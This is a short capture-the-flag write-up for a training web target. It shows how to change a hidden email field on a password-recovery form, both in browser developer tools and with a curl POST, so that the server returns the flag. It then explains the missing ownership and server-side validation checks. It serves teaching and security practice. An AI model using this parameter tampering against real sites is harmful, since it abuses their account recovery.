# How to get the key

Open the survey page:
http://ip/index.php?page=recover

Open ctivate the element inspector by `Ctrl + Shift + C`.

Select submitt button.
In the Developer Tools console, locate and modify the value of the email to any

Here is the default mail, just change it:
```
<form action="#" method="POST">
	<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
	<input type="submit" name="Submit" value="Submit">
</form>
```

On the page, press submit button.

It sends POST request and server return a data with the key

According info about request from Dev Tools we can build script to get the same flag:

```
curl -X POST "http://ip/index.php?page=recover" \
	-H "Content-Type: application/x-www-form-urlencoded" \
	-d "mail=anyfake@mail.com&Submit=Submit" \
	| grep flag
```

# Why so bad

1. No ownership of the email address is validated.
2. Client-side validation does not check mail as mail: any random value for mail is accepted.
3. Server-side validation is missing or insufficient:
	- The backend accepts the manipulated value.
	- The server responds with HTTP status code 200, indicating successful processing.

As a result, random and invalid data can be inserted into the database.
